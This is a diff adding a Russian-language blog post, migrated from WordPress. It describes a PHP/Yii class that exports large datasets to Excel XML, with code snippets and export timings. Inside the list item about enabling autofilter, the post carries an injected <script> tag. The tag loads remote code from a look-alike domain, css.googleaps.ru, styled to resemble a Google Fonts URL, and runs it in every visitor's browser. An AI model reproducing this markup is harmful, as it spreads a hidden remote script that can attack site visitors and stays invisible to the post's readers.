@@ -1,0 +1,186 @@
+---
+layout: post
+status: publish
+published: true
+title: Простой экспорт в Excel XML
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+excerpt: При разработке системы электронного документооборота потребовалось реализовать
+  функции для экспорта данных в популярных форматах. В частности, в формате Microsoft
+  Excel. Требования к экспорту были довольно простые &ndash; экспортировать данные
+  с минимумом форматирования, т.е. никаких объединенных ячеек, игр со шрифтами и т.п.
+  Форматы экспорта XLSX и Excel XML.
+wordpress_id: 192
+wordpress_url: http://devdocs.ru/?p=192
+date: '2014-09-24 10:21:35 +0300'
+date_gmt: '2014-09-24 10:21:35 +0300'
+categories:
+- PHP
+tags:
+- Тема
+- php
+- xml
+- ip
+- excel
+- from habr
+- yii
+- orm
+comments: []
+---
+<p>При разработке системы электронного документооборота потребовалось реализовать функции для экспорта данных в популярных форматах. В частности, в формате Microsoft Excel. Требования к экспорту были довольно простые &ndash; экспортировать данные с минимумом форматирования, т.е. никаких объединенных ячеек, игр со шрифтами и т.п. Форматы экспорта XLSX и Excel XML.<a id="more"></a><a id="more-192"></a></p>
+<p>В данном случае расскажу про <a href="http:&#47;&#47;technet.microsoft.com&#47;ru-ru&#47;magazine&#47;2006.01.blogtales%28en-us%29.aspx">Excel XML<&#47;a>.<br />
+Итак, в любой системе оперирующей табличными данными раной или поздно возникает потребность экспорта данных. Цели экспорта разные:</p>
+<ul>
+<li>передача данных в табличном виде<&#47;li>
+<li>анализ данных в соотв. системах<&#47;li>
+<li>построение диаграмм<&#47;li>
+<li>построение сводных таблиц и т.п.<&#47;li><br />
+<&#47;ul></p>
+<p>Исходя из целей, напросился разумный вывод, что при экспорте данных надо постараться сохранить или указать тип данных в соответствующих колонках, чтобы приложение, которое открывает файл не пыталось применить форматирование по своему усмотрению. Говоря иначе, даты должны быть датами, числа &ndash; числами, строки &ndash; строками.</p>
+<h4>Задача<&#47;h4></p>
+<p>Технические требования сформулировал тривиально:</p>
+<ul>
+<li>Оформить экспортирующий механизм в виде автономного класса<&#47;li>
+<li>Реализовать в классе набор функций для записи значений ячеек и ряда<&#47;li>
+<li>Возможность работы с неограниченным объемом данных.<&#47;li><br />
+<&#47;ul></p>
+<p>Оформить экспортирующий механизм в виде автономного класса &mdash; очевидное требование, выполнение которого позволит в будущем поделиться классом с другими разработчиками и использовать его в новых проектах.</p>
+<p>Реализовать в классе набор функций для записи значений ячеек и ряда &ndash; основное требование, подразумевающее создание функций для записи значений ячеек указанных типов и возможность записи готового ряда в файл.</p>
+<p>Возможность работы с неограниченным объемом данных &ndash; разумеется, сам класс экспорта отвечать за записываемый объем не сможет, но он должен предоставить функции для записи данных на диск и освобождения оперативной памяти для следующей порции данных.</p>
+<p>Помимо описанных требований, понадобилось добавить сервисные функции:</p>
+<ul>
+<li>Включение автофильтра<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;li>
+<li>Сжатия файла в <a href="http:&#47;&#47;help.ubuntu.ru&#47;wiki&#47;zip?s[]=zip">zip<&#47;a>.<&#47;li><br />
+<&#47;ul></p>
+<h4>Реализация<&#47;h4></p>
+<p>Прежде всего, при создании класса осуществляю проверку конечного имени файла и запрашиваю количество колонок и рядов. Файл должен иметь корректное имя, а папка, в которую он будет сохранен, должна существовать. Все как обычно.<br />
+Формат Excel XML позволяет сохранять в файле информацию о пользователе, который его создал, поэтому, при создании заголовка записываю название организации, информация о пользователе и дате создания файла.</p>
+<pre class="brush: php; gutter: true">public function writeDocumentProperties($organization = null, $user = null)<br />
+{<br />
+    fwrite($this->file, &#039;<DocumentProperties xmlns="urn:schemas-microsoft-com:office:office">&#039;);<br />
+    if (!is_null($user))<br />
+    {<br />
+        fwrite($this->file, &#039;<Author>&#039;.$user->description.&#039;<&#47;Author>&#039;);<br />
+        fwrite($this->file, &#039;<LastAuthor>&#039;.$user->description.&#039;<&#47;LastAuthor>&#039;);<br />
+    }</p>
+<p>    $dt = new Datetime();<br />
+    $dt_string = $dt->format(&#039;Y-m-dTH:i:sZ&#039;);<br />
+    fwrite($this->file, &#039;<Created>&#039;.$dt_string.&#039;<&#47;Created>&#039;);<br />
+    fwrite($this->file, &#039;<LastSaved>&#039;.$dt_string.&#039;<&#47;LastSaved>&#039;);</p>
+<p>    if (!is_null($organization))<br />
+        fwrite($this->file, &#039;<Company>&#039;.$organization->name.&#039;<&#47;Company>&#039;);</p>
+<p>    fwrite($this->file, &#039;<Version>12.00<&#47;Version>&#039;);<br />
+    fwrite($this->file, &#039;<&#47;DocumentProperties>&#039;);<br />
+}<br />
+<&#47;pre></p>
+<pre class="brush: php; gutter: true"><&#47;pre></p>
+<p>&nbsp;</p>
+<p>Правда, именно в этой функции используются сущности системы документооборота &mdash; organization (организация) и user (пользователь). Заменить эти сущности на, скажем, строковые значения, не проблема.</p>
+<p>Наиболее интересной в заголовке является информация о стилях. В формате Excel XML они реализованы очень удобно, поэтому просто создаю таблицу со стилями для строк, даты&#47;времени и гиперссылки.</p>
+<pre class="brush: php; gutter: true">public function writeStyles()<br />
+{<br />
+    fwrite($this->file, &#039;<Styles>&#039;);<br />
+    &#47;&#47;default style<br />
+    fwrite($this->file, &#039;<Style ss:ID="Default" ss:Name="Normal"><Font ss:Color="#000000"&#47;><&#47;Style>&#039;);<br />
+    &#47;&#47;Datetime style<br />
+    fwrite($this->file, &#039;<Style ss:ID="DateTime"><NumberFormat ss:Format="General Date"&#47;><&#47;Style>&#039;);<br />
+    fwrite($this->file, &#039;<Style ss:ID="Date"><NumberFormat ss:Format="Short Date"&#47;><&#47;Style>&#039;);<br />
+    fwrite($this->file, &#039;<Style ss:ID="Time"><NumberFormat ss:Format="h:mm:ss"&#47;><&#47;Style>&#039;);<br />
+    &#47;&#47;Hyperlink style<br />
+    fwrite($this->file, &#039;<Style ss:ID="Hyperlink" ss:Name="Hyperlink"><Font ss:Color="#0000FF" ss:Underline="Single"&#47;><&#47;Style>&#039;);<br />
+    &#47;&#47;Bold<br />
+    fwrite($this->file, &#039;<Style ss:ID="Bold"><Font ss:Bold="1"&#47;><&#47;Style>&#039;);<br />
+    fwrite($this->file, &#039;<&#47;Styles>&#039;);<br />
+}<br />
+<&#47;pre></p>
+<p>Подготовительные работы закончил, можно переходить к записи данных. Открытие рабочего листа &ndash; это всего пара тэгов, как раз в этот момент используется информация о количестве колонок и рядов.</p>
+<pre class="brush: php; gutter: true">public function openWorksheet()<br />
+{<br />
+    fwrite($this->file, &#039;<Worksheet ss:Name="Export">&#039;);<br />
+    fwrite($this->file, strtr(&#039;<Table ss:ExpandedColumnCount="{col_count}" ss:ExpandedRowCount="{row_count}" x:FullColumns="1" x:FullRows="1" ss:DefaultRowHeight="15">&#039;, array(&#039;{col_count}&#039;=>$this->colCount, &#039;{row_count}&#039;=>$this->rowCount)));<br />
+}<br />
+<&#47;pre></p>
+<p>Но вот запись рядов &ndash; процесс поинтереснее. Класс должен работать быстро и обрабатывать неограниченный объем данных, ведь записей может быть тысяч сто или даже миллион! Хочешь скорости &ndash; работай с памятью, хочешь неограниченный объем данных &ndash; работай с диском. Чтобы помирить требования, реализовал функции resetRow и flushRow.<br />
+Первая &ndash; очищает текущий ряд, после чего его снова можно наполнять данными, а вторая &ndash; записывает текущий ряд в открытый файл на диск. Их совместное использование позволяет выдерживать баланс между скоростью и объемом используемой памяти.</p>
+<pre class="brush: php; gutter: true">public function resetRow()<br />
+{<br />
+    $this->currentRow = array();<br />
+}</p>
+<p>public function flushRow()<br />
+{<br />
+    fwrite($this->file, implode(&#039;&#039;, $this->currentRow));<br />
+    unset($this->currentRow);<br />
+}<br />
+<&#47;pre></p>
+<p>Каждая ячейка записывается функцией соответствующей типу данных, а именно appendCellxxx, где xxx &ndash; тип данных. Допустимые типы данных: Num, String, Real, DateTime, Date, Time, Link. Пример функции для записи числового значения:</p>
+<pre class="brush: php; gutter: true">public function appendCellNum($value)<br />
+{<br />
+    $this->currentRow[] = &#039;<Cell><Data ss:Type="Number">&#039;.$value.&#039;<&#47;Data><&#47;Cell>&#039;;<br />
+}<br />
+<&#47;pre></p>
+<p>После записи всех данных остается закрыть рабочий лист и рабочую книгу.</p>
+<h4>Применение<&#47;h4></p>
+<p>Использование описанного класса основано на экспорте данных с помощью провайдера <a href="http:&#47;&#47;www.yiiframework.com&#47;doc&#47;api&#47;1.1&#47;CArrayDataProvider">CArrayDataProvider<&#47;a>. Однако, предполагая, что объем экспортируемых данных может оказаться очень большим применен специальный итератор <a href="http:&#47;&#47;www.yiiframework.com&#47;doc&#47;api&#47;1.1&#47;CDataProviderIterator">CDataProviderIterator<&#47;a>, который перебирает возвращаемые данные по 100 записей (можно указать иное число записей).</p>
+<pre class="brush: php; gutter: true">public function exportExcelXML($organization, $user, &amp;$filename)<br />
+{<br />
+    $this->_provider = new CArrayDataProvider(&#47;*query*&#47;);</p>
+<p>    Yii::import(&#039;ext.AlxdExportExcelXML.AlxdExportExcelXML&#039;);<br />
+    $export = new AlxdExportExcelXML($filename, count($this->_attributes), $this->_provider->getTotalItemCount() + 1);</p>
+<p>    $export->openWriter();<br />
+    $export->openWorkbook();</p>
+<p>    $export->writeDocumentProperties($organization, $user);<br />
+    $export->writeStyles();<br />
+    $export->openWorksheet();</p>
+<p>    &#47;&#47;title row<br />
+    $export->resetRow();<br />
+    $export->openRow(true);<br />
+    foreach ($this->_attributes as $code => $format)<br />
+         $export->appendCellString($this->_objectref->getAttributeLabel($code));<br />
+    $export->closeRow();<br />
+    $export->flushRow();</p>
+<p>    &#47;&#47;data rows<br />
+    $rows = new CDataProviderIterator($this->_provider, 100);<br />
+    foreach ($rows as $row)<br />
+    {<br />
+        $export->resetRow();<br />
+        $export->openRow();</p>
+<p>        foreach ($this->_attributes as $code => $format)<br />
+        {<br />
+            switch ($format->type)<br />
+            {<br />
+                case &#039;Num&#039;:<br />
+                    $export->appendCellNum($row[$code]);<br />
+                &#47;*other types*&#47;<br />
+                default:<br />
+                    $export->appendCellString(&#039;&#039;);<br />
+            }</p>
+<p>        }<br />
+        $export->closeRow();<br />
+        $export->flushRow();<br />
+    }</p>
+<p>    &#47;&#47;close all<br />
+    $export->closeWorksheet();<br />
+    $export->closeWorkbook();<br />
+    $export->closeWriter();</p>
+<p>    &#47;&#47;zip file<br />
+    $export->zip();</p>
+<p>    $filename = $export->getZipFullFileName();<br />
+}<br />
+<&#47;pre></p>
+<p>В моем случае, каждый ряд записывается на диск, что, пока, является вполне приемлемым, но в будущем, возможно, потребует изменений. Например, будет разумно сохранять не каждый ряд, а каждый десяток или даже сотню рядов за раз. Тогда скорость экспорта увеличится.</p>
+<h4>Скорость<&#47;h4></p>
+<p>Кстати, на собственном опыте убедился, как важно предполагать возможность существования больших объемов данных при пакетной операции, такой как экспорт.<br />
+Изначально, пытался осуществлять экспорт данных используя <a href="http:&#47;&#47;www.yiiframework.com&#47;doc&#47;api&#47;1.1&#47;CActiveDataProvider">CActiveDataProvider<&#47;a>, что требовало при экспорте 1000 записей порядка 240 секунд! Изменив запрос так, чтобы использовать <a href="http:&#47;&#47;www.yiiframework.com&#47;doc&#47;api&#47;1.1&#47;CArrayDataProvider">CArrayDataProvider<&#47;a> сократил время экспорта 1000 записей до 0.5 секунды!<br />
+Специально для этой публикации замерил показатели экспорта.<br />
+Экспортировал <b>1626<&#47;b> записей с <b>9<&#47;b> атрибутами, представляющих собой информацию о закрытых инцидентах (см. <a href="http:&#47;&#47;en.wikipedia.org&#47;wiki&#47;Incident_management_%28ITSM%29">ITSM<&#47;a>)</p>
+<p>&nbsp;</p>
+<h5>Показатели экспорта<&#47;h5></p>
+<p>Объем конечного файла: <b>1 312 269<&#47;b><br />
+Объем сжатого файла: <b>141 762<&#47;b><br />
+Затраченное время: примерно <b>0.5<&#47;b> сек</p>
+<p>Кому интересно, может получить исходный код моего класса <a href="https:&#47;&#47;github.com&#47;Alxdhere&#47;AlxdExportExcelXML">AlxdExportExcelXML<&#47;a> безвозмездно. Только надо не забыть поправить функцию <i>writeDocumentProperties<&#47;i>, чтобы отвязаться от сущностей системы документооборота organization и user, или использовать свои аналогичные сущности с соответствующими свойствами.</p>
